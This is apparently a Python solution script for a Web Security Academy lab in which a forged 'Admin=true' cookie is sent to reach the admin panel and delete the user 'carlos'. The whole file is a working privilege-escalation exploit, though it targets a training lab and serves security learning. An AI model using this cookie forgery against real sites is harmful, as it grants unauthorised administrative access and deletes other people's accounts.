##########################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 4/9/2023
#
# Lab: User role controlled by request parameter
#
# Steps: 1. Change the cookie 'Admin' to 'true'
#        2. Fetch the admin panel
#        3. Delete carlos
#
##########################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0af400c90326cbe480a0da4100b300f7.web-security-academy.net"

# set session cookie
cookies = {
    "Admin": "true"
}

print(Fore.WHITE + "1. Changing the cookie 'Admin' to 'true'.. " + Fore.GREEN + "OK")

try:
    # fetch admin panel
    # this step is not necessary in the script, you can do step 2 directrly
    # it's a must only when solving the lab using the browser
    admin_panel = requests.get(f"{url}/admin", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch admin panel through exception")
    exit(1)

print(Fore.WHITE + "2. Fetching the admin panel.. " + Fore.GREEN + "OK")

try:  
    # delete carlos
    delete_carlos = requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to delete carlos through exception")
    exit(1)

print(Fore.WHITE + "3. Deleting carlos.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")

